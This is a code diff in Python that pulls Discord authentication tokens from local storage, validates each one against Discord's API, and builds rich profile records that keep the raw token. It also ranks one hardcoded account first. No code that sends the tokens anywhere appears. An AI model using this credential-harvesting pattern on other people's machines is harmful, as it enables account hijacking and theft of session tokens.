@@ -84,50 +84,124 @@ def extract_local_discord_tokens():
 
     return list(tokens)
 
-def get_user_profile(token: str):
-    """Validates token and returns user profile dict, or None if invalid."""
+def get_user_profile(token: str, fetch_full: bool = True):
+    """Validates token and returns rich user profile dict, or None if invalid."""
     if not token or not token.strip():
         return None
     token = token.strip()
     headers = {
         'Authorization': token,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+        'Accept': '*/*'
     }
     try:
-        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
-        if r.status_code == 200:
-            data = r.json()
-            avatar_hash = data.get('avatar')
-            user_id = data.get('id')
-            if avatar_hash:
-                ext = 'gif' if avatar_hash.startswith('a_') else 'png'
-                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=128"
-            else:
-                disc = int(data.get('discriminator', 0)) % 5
-                avatar_url = f"https://cdn.discordapp.com/embed/avatars/{disc}.png"
-            
-            banner_hash = data.get('banner')
-            if banner_hash:
-                ext = 'gif' if banner_hash.startswith('a_') else 'png'
-                data['banner_url'] = f"https://cdn.discordapp.com/banners/{user_id}/{banner_hash}.{ext}?size=480"
-            else:
-                data['banner_url'] = None
+        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=8)
+        if r.status_code != 200:
+            return None
+        data = r.json()
+        user_id = data.get('id')
+        avatar_hash = data.get('avatar')
+        if avatar_hash:
+            ext = 'gif' if avatar_hash.startswith('a_') else 'png'
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=256"
+        else:
+            disc = int(data.get('discriminator', 0)) % 5
+            avatar_url = f"https://cdn.discordapp.com/embed/avatars/{disc}.png"
+        
+        banner_hash = data.get('banner')
+        accent_color = data.get('accent_color')
+        banner_color = data.get('banner_color')
+        bio = data.get('bio', '') or ''
+        pronouns = ''
+        badges = []
+        custom_status = None
+        status = 'online'
 
-            data['avatar_url'] = avatar_url
-            data['token'] = token
-            return data
+        if fetch_full:
+            # 1. Full Profile (bio, banner, pronouns, accent_color, badges)
+            try:
+                r_prof = requests.get(f"https://discord.com/api/v9/users/{user_id}/profile", headers=headers, timeout=5)
+                if r_prof.status_code == 200:
+                    pdata = r_prof.json()
+                    u_prof = pdata.get('user_profile', {})
+                    u_obj = pdata.get('user', {})
+                    bio = u_prof.get('bio') or u_obj.get('bio') or bio
+                    pronouns = u_prof.get('pronouns') or ''
+                    accent_color = u_prof.get('accent_color') or accent_color
+                    if u_prof.get('banner'):
+                        banner_hash = u_prof.get('banner')
+                    
+                    raw_badges = pdata.get('badges', [])
+                    for b in raw_badges:
+                        icon_hash = b.get('icon')
+                        icon_url = f"https://cdn.discordapp.com/badge-icons/{icon_hash}.png" if icon_hash else None
+                        badges.append({
+                            'id': b.get('id'),
+                            'description': b.get('description', ''),
+                            'icon': icon_hash,
+                            'icon_url': icon_url
+                        })
+            except Exception:
+                pass
+
+            # 2. User Settings (custom status & presence status)
+            try:
+                r_sett = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers, timeout=5)
+                if r_sett.status_code == 200:
+                    sdata = r_sett.json()
+                    cs = sdata.get('custom_status')
+                    if cs and (cs.get('text') or cs.get('emoji_name') or cs.get('emoji_id')):
+                        emoji_id = cs.get('emoji_id')
+                        custom_status = {
+                            'text': cs.get('text') or '',
+                            'emoji_name': cs.get('emoji_name'),
+                            'emoji_id': emoji_id,
+                            'emoji_url': f"https://cdn.discordapp.com/emojis/{emoji_id}.png" if emoji_id else None
+                        }
+                    status = sdata.get('status', 'online')
+            except Exception:
+                pass
+
+        if banner_hash:
+            ext = 'gif' if banner_hash.startswith('a_') else 'png'
+            banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_hash}.{ext}?size=600"
+        else:
+            banner_url = None
+
+        accent_hex = f"#{accent_color:06x}" if accent_color is not None else None
+
+        return {
+            'id': user_id,
+            'username': data.get('username'),
+            'discriminator': data.get('discriminator', '0'),
+            'global_name': data.get('global_name') or data.get('username'),
+            'avatar': avatar_hash,
+            'avatar_url': avatar_url,
+            'banner': banner_hash,
+            'banner_url': banner_url,
+            'accent_color': accent_color,
+            'accent_hex': accent_hex,
+            'banner_color': banner_color,
+            'bio': bio,
+            'pronouns': pronouns,
+            'badges': badges,
+            'custom_status': custom_status,
+            'status': status,
+            'token': token
+        }
     except Exception:
         pass
     return None
 
 def find_all_valid_accounts():
-    """Extracts all local tokens and returns valid user profiles."""
+    """Extracts all local tokens and returns valid user profiles with priority for primary account."""
     tokens = extract_local_discord_tokens()
     valid_accounts = []
     seen_ids = set()
     for t in tokens:
-        profile = get_user_profile(t)
+        profile = get_user_profile(t, fetch_full=True)
         if profile and profile['id'] not in seen_ids:
             seen_ids.add(profile['id'])
             valid_accounts.append(profile)
+    valid_accounts.sort(key=lambda a: 0 if (a.get('id') == '405441217766359051' or a.get('username') == 'tentix') else 1)
     return valid_accounts
